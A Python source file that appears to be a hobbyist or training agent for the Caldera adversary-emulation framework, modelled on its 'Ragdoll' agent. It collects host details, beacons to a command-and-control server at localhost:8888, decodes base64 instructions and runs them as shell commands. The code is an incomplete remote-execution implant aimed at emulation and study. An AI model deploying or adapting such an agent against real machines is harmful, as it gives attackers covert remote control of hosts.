import subprocess
import json
import base64
import argparse
import socket
import os
import platform
import time


class OperationLoop:
    
    def __init__(self, profile):
        self.profile = profile
        self.file_download_endpoint = "/file/download"
        self.file_download_url = self.profile['server'].split('/weather')[0] + self.file_download_endpoint
    

    def start(self):
    
        print(self.profile)
        # Construct the curl command and execute it using subprocess. 
        profilejson = json.dumps(self.profile).encode('utf-8')
        profileb64 =  base64.b64encode(profilejson).decode('utf-8')
        curl_cmd = f"curl -s -X POST -d {profileb64} localhost:8888/beacon"
        raw_result = subprocess.run(curl_cmd, shell=True, capture_output=True) #shell=True may be a security concern. Watch out!

        
        result_dict = self.decodeshell_to_json(raw_result)  #from here we can retrieve all parameters given by caldera server
        
        #Retrieve all needeed parameters
        paw = result_dict['paw']
        
        # Print the output
        print ("Agent deployed. Paw assigned:")
        print(paw)
        self.AgentLoop(result_dict)

    def AgentLoop(self, beaconanswer):
        print("Now in the operation loop")

        #In the first step we'll execute the given instruction
        output = self.execute_command(beaconanswer)

        #Then we will construct the beacon to send to the server as an answer
        response = self.build_response(output)
        


    def execute_command(self, beaconanswer):
        print(beaconanswer)
        # convert stringified instructions to a list of dictionaries
        instructions = json.loads(beaconanswer['instructions'])
        # retrieve the command field from the first dictionary in the instructions list
        dec = instructions[0]
        command = json.loads(dec)['command']  #the command here is in base64
        decoded_command = base64.b64decode(command)
        print(decoded_command)
        output = subprocess.run(decoded_command, shell=True, capture_output=True)
        print("Risultato shell:",output)
        return output
    
    def build_response(self, output):
        print(output.returncode)
        
    @staticmethod
    def decodeshell_to_json(s):
        b64result = s.stdout.decode('utf-8')

        result = base64.b64decode(b64result)

        result_dict = json.loads(result)
        return result_dict



def build_profile(server_addr):
    return dict(
        server=server_addr,
        host=socket.gethostname(),
        platform=platform.system().lower(),
        executors=['sh'],
        pid=os.getpid()
    )

#Typical "if" in python's script. It checks if the script was executed directly as a script (opposed as if it was a submodule)
if __name__ == '__main__':  
    parser = argparse.ArgumentParser('Start here')
    parser.add_argument('-W', '--website', required=False, default='http://localhost:8888/weather')   #As for Ragdoll Agent, if not specified (with -W, remember the /weather!!) the default URL will be that one 
    #In the original agent (private repo), here'll go another argument for the url of the remote agent
    args = parser.parse_args()
    try:
        p = build_profile('%s' % args.website)
        OperationLoop(profile=p).start()
        
    except Exception as e:
        print('[-] Web page may not be accessible, or: %s' % e)
